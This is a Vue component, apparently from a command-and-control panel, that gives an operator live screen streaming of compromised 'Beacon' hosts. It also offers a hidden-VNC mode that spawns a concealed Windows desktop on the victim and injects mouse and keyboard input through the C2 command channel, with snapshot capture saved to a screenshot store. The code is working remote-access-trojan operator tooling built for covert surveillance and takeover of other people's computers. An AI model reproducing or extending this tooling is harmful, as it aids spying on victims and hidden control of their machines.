<template>
  <div class="cs-monitor-view cs-font-ui">
    <!-- Toolbar -->
    <div class="mv-toolbar">
      <div class="mv-title-group">
        <el-icon class="mv-title-icon"><Monitor /></el-icon>
        <span class="mv-title">{{ isZh ? '屏幕实时监控: ' : 'Desktop: ' }}{{ currentClientTitle }}</span>
        <span class="mv-status" :class="isMonitoring || hvncActive ? 'is-on' : 'is-off'">
          {{ (isMonitoring || hvncActive) ? (isZh ? '● 实时推流中' : '● Live Streaming') : (isZh ? '● 未启动' : '● Idle') }}
        </span>
      </div>

      <div class="mv-spacer" />

      <!-- Mode Selector -->
      <span class="mv-label">{{ isZh ? '模式:' : 'Mode:' }}</span>
      <el-select v-model="monitorMode" style="width: 120px">
        <el-option :label="isZh ? '屏幕流' : 'Stream'" value="normal" />
        <el-option :label="isZh ? 'HVNC (隐蔽)' : 'HVNC'" value="hvnc" :disabled="isLinuxClient" />
      </el-select>
    </div>

    <!-- 操作条（vshell：操作集中在内容上方，取代原底部按钮行） -->
    <div class="mv-action-bar">
      <button
        v-if="monitorMode === 'normal'"
        class="cs-btn"
        :class="isMonitoring ? 'cs-btn-danger' : 'cs-btn-primary'"
        :disabled="isConnecting"
        @click="toggleMonitoring"
      >
        <el-icon :class="{ 'is-loading': isConnecting }"><VideoPlay v-if="!isMonitoring" /><VideoPause v-else /></el-icon>
        <span>{{ isMonitoring ? (isZh ? '停止推流' : 'Stop Stream') : (isZh ? '开始推流' : 'Start Stream') }}</span>
      </button>

      <button
        v-if="monitorMode === 'normal'"
        class="cs-btn"
        :disabled="!isMonitoring || !streamUrl"
        @click="captureCurrentFrame"
      >
        <el-icon><Camera /></el-icon>
        <span>{{ isZh ? '截图留存' : 'Snapshot' }}</span>
      </button>

      <button
        v-if="monitorMode === 'hvnc'"
        class="cs-btn"
        :class="hvncActive ? 'cs-btn-danger' : 'cs-btn-primary'"
        :disabled="hvncConnecting || isLinuxClient"
        @click="hvncActive ? stopHvnc() : startHvnc()"
      >
        <span>{{ hvncActive ? (isZh ? '停止 HVNC' : 'Stop HVNC') : (isZh ? '启动 HVNC' : 'Start HVNC') }}</span>
      </button>

      <span class="mv-action-sep" />

      <button class="cs-btn" :disabled="!streamUrl" @click="zoomReset">
        {{ isZh ? '重置比例 1:1' : 'Zoom 1:1' }}
      </button>

      <button class="cs-btn" @click="toggleFullscreen">
        {{ isFullscreen ? (isZh ? '退出全屏' : 'Exit Fullscreen') : (isZh ? '全屏查看' : 'Fullscreen') }}
      </button>

      <button class="cs-btn" @click="handleHelp">
        {{ isZh ? '帮助' : 'Help' }}
      </button>
    </div>

    <!-- Main Canvas Viewport -->
    <div class="mv-body">
      <!-- Normal Stream View -->
      <template v-if="monitorMode === 'normal'">
        <div v-if="isMonitoring" class="mv-screen-wrap" ref="videoContainer" @wheel.prevent="onWheelZoom" @dblclick="zoomReset">
          <img
            v-if="streamUrl"
            :src="streamUrl"
            alt="Live Desktop"
            class="mv-screen-img"
            @load="onFrameLoad"
            @error="onFrameError"
            :style="{ transform: `scale(${zoomLevel})` }"
          />

          <!-- Live OSD Overlay -->
          <div class="mv-osd-badge">
            <span>FPS: {{ currentFps }} | {{ isZh ? '延迟' : 'Latency' }}: {{ latency }}ms | {{ currentTime }}</span>
          </div>

          <!-- Floating Zoom Controls -->
          <div class="sc-floating-controls">
            <button class="cs-btn cs-btn-xs" @click.stop="zoomOut">－</button>
            <span class="zoom-text">{{ Math.round(zoomLevel * 100) }}%</span>
            <button class="cs-btn cs-btn-xs" @click.stop="zoomIn">＋</button>
            <button class="cs-btn cs-btn-xs" @click.stop="zoomReset">1:1</button>
          </div>
        </div>

        <div v-else class="mv-empty-screen">
          <EmptyState
            icon="🖥"
            variant="inline"
            :title="isZh ? '桌面监控推流未启动' : 'Desktop Stream Inactive'"
            :desc="isZh ? '点击【开始推流】启动被控端桌面实时推流画面。' : 'Click [ Start Stream ] to begin live desktop monitoring.'"
          />
        </div>
      </template>

      <!-- HVNC Interactive Canvas -->
      <template v-else>
        <div v-if="hvncActive" class="mv-screen-wrap">
          <canvas
            ref="hvncCanvas"
            tabindex="0"
            class="mv-hvnc-canvas"
            @mousemove="hvncMouseMove"
            @mousedown="hvncMouseDown"
            @mouseup="hvncMouseUp"
            @wheel.prevent="hvncWheel"
            @keydown="hvncKeyDown"
            @keyup="hvncKeyUp"
            @contextmenu.prevent
          />
          <div class="mv-osd-badge">
            <span>{{ isZh ? `HVNC 已激活 (${hvncSid}) - 点击画布聚焦以交互操作` : `HVNC Active (${hvncSid}) - Focus canvas to inject inputs` }}</span>
          </div>
        </div>

        <div v-else class="mv-empty-screen">
          <EmptyState
            icon="🪟"
            variant="inline"
            :title="isZh ? '隐蔽桌面 (HVNC)' : 'Hidden VNC (HVNC) Desktop'"
            :desc="isLinuxClient
              ? (isZh ? 'HVNC 仅支持 Windows 目标会话。' : 'HVNC is only supported on Windows Beacon sessions.')
              : (isZh ? '点击【启动 HVNC】创建隐蔽交互式 Windows 桌面会话。' : 'Click [ Start HVNC ] to spawn a hidden interactive Windows desktop session.')"
          />
        </div>
      </template>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, onActivated, onDeactivated, onMounted, onUnmounted, ref } from 'vue'
import type { ComputedRef, Ref } from 'vue'
import { useRoute } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Monitor, VideoPlay, VideoPause, Camera } from '@element-plus/icons-vue'
import { useClientUid } from '@/utils/clientUtils'
import { useClientsStore } from '@/stores/clients'
import { useUserStore } from '@/stores/user'
import { useI18nStore } from '@/stores/i18n'
import { useScreenshotsStore } from '@/stores/screenshots'
import ClientAPI from '@/api/clients'
import EmptyState from '@/components/Common/EmptyState.vue'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const route = useRoute()
const clientsStore = useClientsStore()
const userStore = useUserStore()
const screenshotsStore = useScreenshotsStore()

const injectedUid = inject<Ref<string> | ComputedRef<string> | null>('realUid', null)

const getUid = () => {
  const v = injectedUid && (injectedUid as any).value ? String((injectedUid as any).value) : ''
  if (v && v.length > 10) return v
  const mapped = useClientUid(route)
  return typeof mapped === 'string' && mapped.length > 10 ? mapped : ''
}

const currentClientTitle = computed(() => {
  const uid = getUid()
  if (!uid) return 'Active Beacon'
  const c = clientsStore.getClientByUid(uid)
  return c ? `${c.Computer || c.Username || 'Beacon'} (${c.InternalIP || c.ExternalIP || '127.0.0.1'})` : uid.slice(0, 8)
})

const isMonitoring = ref(false)
// 本标签是否为活动标签页(推流/HVNC 轮询在非活动时降速/暂停)
const isConnecting = ref(false)
const streamUrl = ref('')
const zoomLevel = ref(1)
const currentTime = ref('')
const monitorMode = ref<'normal' | 'hvnc'>('normal')
const isFullscreen = ref(false)

const currentFps = ref(0)
const latency = ref(0)
const frameTimestamps: number[] = []

const videoContainer = ref<HTMLElement>()

const hvncSid = ref('')
const hvncActive = ref(false)
const hvncConnecting = ref(false)
const hvncCanvas = ref<HTMLCanvasElement>()
let hvncWs: WebSocket | null = null
let hvncPollTimer: number | null = null

const isLinuxClient = computed(() => {
  const uid = getUid()
  const c = clientsStore.getClientByUid(uid)
  const arch = (c?.Arch || '').toLowerCase()
  return arch.includes('linux') || arch.includes('darwin') || arch.includes('kali')
})

let streamTimer: number | null = null

function updateTime() {
  currentTime.value = new Date().toLocaleTimeString('en-GB')
}

function zoomIn() {
  zoomLevel.value = Math.min(4, zoomLevel.value + 0.15)
}

function zoomOut() {
  zoomLevel.value = Math.max(0.2, zoomLevel.value - 0.15)
}

function zoomReset() {
  zoomLevel.value = 1
}

function onWheelZoom(e: WheelEvent) {
  if (!streamUrl.value) return
  if (e.deltaY < 0) zoomIn()
  else zoomOut()
}

// 标签被 KeepAlive 切走时暂停重资产请求（与 useVisibilityInterval 同源语义）
const tabHidden = ref(false)
onActivated(() => { tabHidden.value = false })
onDeactivated(() => { tabHidden.value = true })

async function fetchStreamFrame() {
  if (!isMonitoring.value) return
  // 【性能】桌面推流是最重的轮询(400ms/帧)。页面隐藏或本标签非活动时跳过请求,
  // 仅以 1s 慢速续排——切回标签立即恢复推流(此前切走的标签仍 2.5 req/s 全速拉流)
  if (tabHidden.value || document.visibilityState === 'hidden') {
    streamTimer = window.setTimeout(fetchStreamFrame, 1000)
    return
  }
  const uid = getUid()
  if (!uid) return

  const start = Date.now()
  try {
    const res = await ClientAPI.get_monitor_frame({ uid })
    if (res.data && res.data.status === 200 && res.data.data) {
      let dataUrl = res.data.data
      if (!dataUrl.startsWith('data:image')) {
        dataUrl = `data:image/jpeg;base64,${dataUrl}`
      }
      streamUrl.value = dataUrl
      latency.value = Date.now() - start
      frameTimestamps.push(Date.now())
      while (frameTimestamps.length && frameTimestamps[0] < Date.now() - 1000) {
        frameTimestamps.shift()
      }
      currentFps.value = frameTimestamps.length
    }
  } catch {
    // Silent catch
  }

  if (isMonitoring.value) {
    streamTimer = window.setTimeout(fetchStreamFrame, 400)
  }
}

async function toggleMonitoring() {
  const uid = getUid()
  if (!uid) return
  if (isMonitoring.value) {
    isMonitoring.value = false
    if (streamTimer) {
      clearTimeout(streamTimer)
      streamTimer = null
    }
    streamUrl.value = ''
    try { await ClientAPI.stop_screen_monitor({ uid }) } catch { /* Silent */ }
    ElMessage.info(isZh.value ? '桌面推流已停止' : 'Desktop stream stopped')
  } else {
    isConnecting.value = true
    try {
      const res = await ClientAPI.start_screen_monitor({ uid, frameRate: 5 })
      if (res.data && res.data.status === 200) {
        isMonitoring.value = true
        ElMessage.success(isZh.value ? '桌面推流已启动' : 'Desktop stream started')
        fetchStreamFrame()
      } else {
        ElMessage.error(res.data?.message || (isZh.value ? '启动推流失败' : 'Failed to start stream'))
      }
    } catch (e: any) {
      ElMessage.error(e?.message || (isZh.value ? '启动推流失败' : 'Failed to start stream'))
    } finally {
      isConnecting.value = false
    }
  }
}

function captureCurrentFrame() {
  if (!streamUrl.value) return
  const uid = getUid()
  const client = clientsStore.getClientByUid(uid)
  const clientUser = client?.Username || 'SYSTEM *'
  const clientComp = client?.Computer || client?.ExternalIP || 'Host'
  const clientHost = `${clientUser}@${clientComp}`
  const nowStr = new Date().toLocaleTimeString()

  screenshotsStore.addScreenshot({
    id: `sc_mon_${Date.now()}`,
    uid,
    host: clientHost,
    user: clientUser,
    computer: clientComp,
    session: client?.Session || '1',
    title: `[监控快照] ${clientComp} (${nowStr})`,
    dataUrl: streamUrl.value,
    time: new Date().toLocaleString(),
    quality: 1,
    qualityLabel: isZh.value ? '监控快照' : 'Snapshot',
  })

  const a = document.createElement('a')
  a.href = streamUrl.value
  a.download = `monitor_snapshot_${clientComp.replace(/[^\w]/g, '_')}_${Date.now()}.jpg`
  a.click()
  ElMessage.success(isZh.value ? '当前帧已截取并同步至屏幕截图仓库！' : 'Frame captured and synced to Screenshots!')
}

function onFrameLoad() {}
function onFrameError() {}

// ================= HVNC Controls =================
// 【断链修复】原实现只有启停: hvncWs 未连接、输入 handler 全空、sid 取值层级错误。
// 现接线: WS(/api/hvnc/connect)收原始 JPEG 帧→canvas;WS 断开自动切 REST 轮询兜底;
// 鼠标键盘输入归一化后经命令通道下发(60ms 聚合窗口,防打满 beacon 命令队列)。

const startHvnc = async () => {
  if (isLinuxClient.value) {
    ElMessage.warning(isZh.value ? 'HVNC 仅支持 Windows 目标' : 'HVNC is only supported on Windows')
    return
  }
  hvncConnecting.value = true
  try {
    const res = await ClientAPI.start_hvnc({ uid: getUid(), app: '', args: '' })
    // 后端契约 {status:200, data:{sid}} —— 原取 res.data.sid 层级错误
    const sid = res.data?.data?.sid
    if (res.data && res.data.status === 200 && sid) {
      hvncSid.value = sid
      hvncActive.value = true
      connectHvncWs()
      ElMessage.success(isZh.value ? 'HVNC 会话启动成功' : 'HVNC session started')
    } else {
      ElMessage.error(res.data?.message || (isZh.value ? '启动 HVNC 失败' : 'Failed to start HVNC'))
    }
  } catch (e: any) {
    ElMessage.error(e?.message || (isZh.value ? '启动 HVNC 异常' : 'HVNC start error'))
  } finally {
    hvncConnecting.value = false
  }
}

// HVNC 帧渲染: 二进制 JPEG → ImageBitmap → canvas(尺寸自适应帧分辨率)
async function renderHvncFrame(bytes: Uint8Array) {
  const canvas = hvncCanvas.value
  if (!canvas) return
  try {
    const blob = new Blob([bytes], { type: 'image/jpeg' })
    const bmp = await createImageBitmap(blob)
    if (canvas.width !== bmp.width || canvas.height !== bmp.height) {
      canvas.width = bmp.width
      canvas.height = bmp.height
    }
    const ctx = canvas.getContext('2d')
    if (ctx) ctx.drawImage(bmp, 0, 0)
    bmp.close()
    const now = performance.now()
    frameTimestamps.push(now)
    while (frameTimestamps.length > 0 && now - frameTimestamps[0] > 1000) frameTimestamps.shift()
    currentFps.value = frameTimestamps.length
  } catch { /* 解码失败跳过该帧 */ }
}

// REST 轮询兜底(WS 不可用时;返回 data URI 文本)
async function pollHvncFrame() {
  if (!hvncActive.value || hvncWs) return
  // 【性能】非活动标签/页面隐藏时跳过轮询(interval 仍空转检查,恢复立即可用)
  if (tabHidden.value || document.visibilityState === 'hidden') return
  try {
    const res = await ClientAPI.get_hvnc_frame({ uid: getUid(), sid: hvncSid.value })
    const d = res.data?.data
    if (typeof d === 'string' && d.startsWith('data:image/')) {
      const b64 = d.slice(d.indexOf(',') + 1)
      const bin = atob(b64)
      const bytes = new Uint8Array(bin.length)
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i)
      renderHvncFrame(bytes)
    }
  } catch { /* 轮询失败静默,下轮重试 */ }
}

function startHvncPolling() {
  if (hvncPollTimer) return
  hvncPollTimer = window.setInterval(pollHvncFrame, 1000)
}

function stopHvncPolling() {
  if (hvncPollTimer) { clearInterval(hvncPollTimer); hvncPollTimer = null }
}

async function connectHvncWs() {
  // access token 仅存内存：刷新页面后为空，先凭 Cookie 续期再连（服务端另有 Cookie 回退兜底）
  const token = await userStore.ensureToken()
  if (!token) { startHvncPolling(); return }
  const proto = location.protocol === 'https:' ? 'wss' : 'ws'
  const ws = new WebSocket(`${proto}://${location.host}/api/hvnc/connect?uid=${encodeURIComponent(getUid())}&sid=${encodeURIComponent(hvncSid.value)}`)
  ws.binaryType = 'arraybuffer'
  ws.onopen = () => {
    ws.send(JSON.stringify({ type: 'auth', content: token }))
    stopHvncPolling() // WS 可用则停轮询
  }
  ws.onmessage = (ev) => {
    if (typeof ev.data === 'string') {
      // 控制消息: error/unauthorized 等
      try { const m = JSON.parse(ev.data); if (m.type === 'error') startHvncPolling() } catch { /* 忽略 */ }
      return
    }
    renderHvncFrame(new Uint8Array(ev.data))
  }
  ws.onclose = () => { if (hvncWs === ws) hvncWs = null; if (hvncActive.value) startHvncPolling() }
  ws.onerror = () => { try { ws.close() } catch {} }
  hvncWs = ws
}

const stopHvnc = async () => {
  if (hvncWs) { try { hvncWs.close() } catch {}; hvncWs = null }
  stopHvncPolling()
  flushHvncInput(true)
  try {
    await ClientAPI.stop_hvnc({ uid: getUid(), sid: hvncSid.value })
  } catch {}
  hvncActive.value = false
  hvncSid.value = ''
  ElMessage.info(isZh.value ? 'HVNC 已断开' : 'HVNC stopped')
}

// ================= HVNC 输入注入 =================
// 契约(客户端 hvnc_windows.go): {"mouse":[{"type","x"(0-1),"y"(0-1),"button","wheel"}],
// "keys":[{"type","scan","vk"}]}; 每条输入=一次 C2 命令帧,故按 60ms 窗口聚合批量。

interface HvncMouseEvent { type: string; x: number; y: number; button?: number; wheel?: number }
interface HvncKeyEvent { type: string; scan: number; vk: number }

const hvncMouseBuf: HvncMouseEvent[] = []
const hvncKeyBuf: HvncKeyEvent[] = []
let hvncFlushTimer: number | null = null
let hvncLastMoveSent = 0

// W3C USB scan code 映射(客户端 SendInput KEYEVENTF_SCANCODE 消费)
const SCAN_CODE_MAP: Record<string, number> = {
  Backquote: 0x35, Digit1: 0x02, Digit2: 0x03, Digit3: 0x04, Digit4: 0x05, Digit5: 0x06,
  Digit6: 0x07, Digit7: 0x08, Digit8: 0x09, Digit9: 0x0A, Digit0: 0x0B, Minus: 0x0C, Equal: 0x0D,
  Backspace: 0x0E, Tab: 0x0F, KeyQ: 0x10, KeyW: 0x11, KeyE: 0x12, KeyR: 0x13, KeyT: 0x14,
  KeyY: 0x15, KeyU: 0x16, KeyI: 0x17, KeyO: 0x18, KeyP: 0x19, BracketLeft: 0x1A, BracketRight: 0x1B,
  Enter: 0x1C, ControlLeft: 0x1D, KeyA: 0x1E, KeyS: 0x1F, KeyD: 0x20, KeyF: 0x21, KeyG: 0x22,
  KeyH: 0x23, KeyJ: 0x24, KeyK: 0x25, KeyL: 0x26, Semicolon: 0x27, Quote: 0x28, Backslash: 0x2B,
  ShiftLeft: 0x2A, IntlBackslash: 0x56, KeyZ: 0x2C, KeyX: 0x2D, KeyC: 0x2E, KeyV: 0x2F,
  KeyB: 0x30, KeyN: 0x31, KeyM: 0x32, Comma: 0x33, Period: 0x34, Slash: 0x35, ShiftRight: 0x36,
  NumpadMultiply: 0x37, AltLeft: 0x38, Space: 0x39, CapsLock: 0x3A, F1: 0x3B, F2: 0x3C, F3: 0x3D,
  F4: 0x3E, F5: 0x3F, F6: 0x40, F7: 0x41, F8: 0x42, F9: 0x43, F10: 0x44, NumLock: 0x45,
  ScrollLock: 0x46, Numpad7: 0x47, Numpad8: 0x48, Numpad9: 0x49, NumpadSubtract: 0x4A,
  Numpad4: 0x4B, Numpad5: 0x4C, Numpad6: 0x4D, NumpadAdd: 0x4E, Numpad1: 0x4F, Numpad2: 0x50,
  Numpad3: 0x51, Numpad0: 0x52, NumpadDecimal: 0x53, IntlRo: 0x87, F11: 0x57, F12: 0x58,
  NumpadEnter: 0x9C, ControlRight: 0x9D, NumpadDivide: 0xB5, AltRight: 0xB8, Home: 0xC7,
  ArrowUp: 0xC8, PageUp: 0xC9, ArrowLeft: 0xCB, ArrowRight: 0xCD, End: 0xCF, ArrowDown: 0xD0,
  PageDown: 0xD1, Insert: 0xD2, Delete: 0xD3, MetaLeft: 0xE0, MetaRight: 0xE7,
}

// 聚合窗口到期把缓冲打成一条 packet 下发
function flushHvncInput(force = false) {
  if (!hvncActive.value) { hvncMouseBuf.length = 0; hvncKeyBuf.length = 0; return }
  if (!force && hvncMouseBuf.length === 0 && hvncKeyBuf.length === 0) return
  const payload = { mouse: hvncMouseBuf.splice(0), keys: hvncKeyBuf.splice(0) }
  if (payload.mouse.length === 0 && payload.keys.length === 0) return
  // 契约: data 为事件 JSON 字符串(客户端 hvncInputPacket: {mouse:[],keys:[]})
  ClientAPI.send_hvnc_input({ uid: getUid(), sid: hvncSid.value, data: JSON.stringify(payload) }).catch(() => {})
}

function queueHvncFlush() {
  if (hvncFlushTimer) return
  hvncFlushTimer = window.setTimeout(() => {
    hvncFlushTimer = null
    flushHvncInput()
  }, 60)
}

// canvas 事件坐标 → 0-1 归一化
function hvncNormCoords(e: MouseEvent): { x: number; y: number } | null {
  const canvas = hvncCanvas.value
  if (!canvas) return null
  const rect = canvas.getBoundingClientRect()
  if (rect.width === 0 || rect.height === 0) return null
  const x = (e.clientX - rect.left) / rect.width
  const y = (e.clientY - rect.top) / rect.height
  if (x < 0 || x > 1 || y < 0 || y > 1) return null
  return { x, y }
}

function hvncMouseMove(e: MouseEvent) {
  if (!hvncActive.value) return
  const now = performance.now()
  if (now - hvncLastMoveSent < 40) return // move 节流 40ms
  const p = hvncNormCoords(e)
  if (!p) return
  hvncLastMoveSent = now
  hvncMouseBuf.push({ type: 'mousemove', x: p.x, y: p.y })
  queueHvncFlush()
}
function hvncMouseDown(e: MouseEvent) {
  if (!hvncActive.value) return
  const p = hvncNormCoords(e)
  if (!p) return
  e.preventDefault()
  hvncMouseBuf.push({ type: 'mousedown', x: p.x, y: p.y, button: e.button })
  queueHvncFlush()
}
function hvncMouseUp(e: MouseEvent) {
  if (!hvncActive.value) return
  const p = hvncNormCoords(e)
  if (!p) return
  hvncMouseBuf.push({ type: 'mouseup', x: p.x, y: p.y, button: e.button })
  queueHvncFlush()
}
function hvncWheel(e: WheelEvent) {
  if (!hvncActive.value) return
  const p = hvncNormCoords(e)
  if (!p) return
  // 滚轮: 正=向下;按 120 粒度(Windows WHEEL_DELTA)归整
  hvncMouseBuf.push({ type: 'wheel', x: p.x, y: p.y, wheel: Math.trunc(e.deltaY / 100) * 120 || (e.deltaY > 0 ? 120 : -120) })
  queueHvncFlush()
}
function hvncKeyDown(e: KeyboardEvent) {
  if (!hvncActive.value) return
  e.preventDefault()
  const scan = SCAN_CODE_MAP[e.code]
  if (!scan) return
  hvncKeyBuf.push({ type: 'keydown', scan, vk: e.keyCode })
  queueHvncFlush()
}
function hvncKeyUp(e: KeyboardEvent) {
  if (!hvncActive.value) return
  e.preventDefault()
  const scan = SCAN_CODE_MAP[e.code]
  if (!scan) return
  hvncKeyBuf.push({ type: 'keyup', scan, vk: e.keyCode })
  queueHvncFlush()
}

function toggleFullscreen() {
  if (!document.fullscreenElement) {
    document.documentElement.requestFullscreen().then(() => {
      isFullscreen.value = true
    }).catch(() => {})
  } else {
    document.exitFullscreen().then(() => {
      isFullscreen.value = false
    }).catch(() => {})
  }
}

function handleHelp() {
  ElMessageBox.alert(
    isZh.value
      ? '【屏幕监控说明】\n1. 支持普通屏幕实时流与 Windows 隐蔽桌面 (HVNC)。\n2. 监控过程中点击「截图留存」可一键将当前帧捕获并自动存入屏幕截图管理。\n3. 支持鼠标滚轮缩放与 1:1 比例重置。'
      : '【Screen Monitor Help】\n1. Realtime screen stream and Windows HVNC.\n2. Click Snapshot to capture current frame to Screenshots gallery.',
    isZh.value ? '屏幕监控帮助' : 'Screen Monitor Help',
    { confirmButtonText: isZh.value ? '确定' : 'OK' },
  )
}

let timeInterval: any = null

onMounted(() => {
  updateTime()
  timeInterval = setInterval(updateTime, 1000)
})

onUnmounted(() => {
  if (timeInterval) clearInterval(timeInterval)
  if (streamTimer) clearTimeout(streamTimer)
  stopHvncPolling()
  if (hvncWs) {
    // 【修复】先摘掉 onclose 再关闭:原顺序下 close 触发 onclose → 在已卸载的
    // 组件里 startHvncPolling() 新建 1s 轮询且再无人清理(永久泄漏)
    hvncWs.onclose = null
    hvncWs.onerror = null
    hvncWs.close()
    hvncWs = null
  }
})
</script>

<style scoped>
.cs-monitor-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.mv-toolbar {
  height: 48px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 0 12px;
  flex-shrink: 0;
}

.mv-title-group {
  display: flex;
  align-items: center;
  gap: 8px;
  min-width: 0;
}

.mv-title-icon {
  font-size: 16px;
  color: var(--cs-log-system);
}

.mv-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* 状态 tag：推流中实心绿底白字 / 空闲灰底灰字 */
.mv-status {
  height: 20px;
  display: inline-flex;
  align-items: center;
  padding: 0 8px;
  border-radius: 4px;
  font-size: 12px;
  white-space: nowrap;
  background: color-mix(in srgb, var(--cs-text-dim) 12%, transparent);
  color: var(--cs-text-dim);
}

.mv-status.is-on {
  background: var(--cs-online);
  color: #ffffff;
}

.mv-spacer { flex: 1; }

.mv-label {
  font-size: 13px;
  color: var(--cs-text);
}

/* 操作条（vshell：操作集中在内容上方，取代原底部按钮行） */
.mv-action-bar {
  height: 48px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 0 12px;
  flex-shrink: 0;
}

.mv-action-sep {
  width: 1px;
  height: 20px;
  background: var(--cs-card-border);
  margin: 0 4px;
}

.mv-body {
  flex: 1;
  margin: 12px;
  background: var(--cs-console);
  border: 1px solid var(--cs-card-border);
  border-radius: 8px;
  position: relative;
  overflow: hidden;
  display: flex;
  align-items: center;
  justify-content: center;
}

.mv-screen-wrap {
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  overflow: auto;
}

.mv-screen-img {
  max-width: 98%;
  max-height: 98%;
  object-fit: contain;
  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.18);
  transition: transform 100ms ease-out;
}

.sc-floating-controls {
  position: absolute;
  bottom: 16px;
  right: 16px;
  display: flex;
  align-items: center;
  gap: 6px;
  background: rgba(24, 24, 24, 0.85);
  border: 1px solid var(--cs-border);
  padding: 4px 8px;
  border-radius: 6px;
  backdrop-filter: blur(4px);
  z-index: 10;
}

.zoom-text {
  font-family: var(--cs-font-mono);
  font-size: 13px;
  color: #ffffff;
  min-width: 48px;
  text-align: center;
}

.mv-hvnc-canvas {
  max-width: 100%;
  max-height: 100%;
  outline: none;
  cursor: crosshair;
}

.mv-osd-badge {
  position: absolute;
  top: 10px;
  right: 10px;
  background: rgba(10, 10, 10, 0.75);
  border: 1px solid var(--cs-border);
  border-radius: 4px;
  padding: 4px 10px;
  font-size: 12px;
  color: #ffffff;
  font-family: var(--cs-font-mono);
  pointer-events: none;
}

.mv-empty-screen {
  color: var(--cs-text-dim);
  text-align: center;
  padding: 24px;
}

.mv-empty-screen :deep(.cs-empty-icon) {
  font-size: 48px;
}

.mv-empty-screen :deep(.cs-empty-title) {
  font-size: 14px;
  color: var(--cs-text);
}

.mv-empty-screen :deep(.cs-empty-desc) {
  font-size: 13px;
}
</style>